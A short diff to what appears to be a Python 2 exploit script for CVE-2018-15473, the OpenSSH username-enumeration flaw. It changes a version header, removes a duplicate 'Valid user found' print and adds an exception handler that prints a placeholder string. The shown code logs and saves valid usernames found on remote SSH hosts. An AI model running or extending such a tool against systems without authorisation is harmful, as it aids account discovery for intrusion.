@@ -5,6 +5,7 @@
 # Software: https://ftp4.usa.openbsd.org/pub/OpenBSD/OpenSSH/openssh-7.7.tar.gz
 # Affected Versions: OpenSSH version < 7.7
 # CVE: CVE-2018-15473
+# Version 1.3
  
 ###########################################################################
 #                ____                    _____ _____ _    _               #
@@ -104,7 +105,6 @@ def checkUsername(runArray, tried=0):
                 print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
                 saveFile(username, host, port, out)
         else:
-            print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
             saveFile(username, host, port, out)
         print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
         return (True)
@@ -149,6 +149,8 @@ def trySocket(host, port):
         print '[-] Connecting to host: ' + host + 'failed. Please check the specified host and port.'
         # sys.exit(1)
         return False, False
+    except paramiko.ssh_exception.SSHException:
+        print "asd"
     return host, port
   
 # assign functions to respective handlers
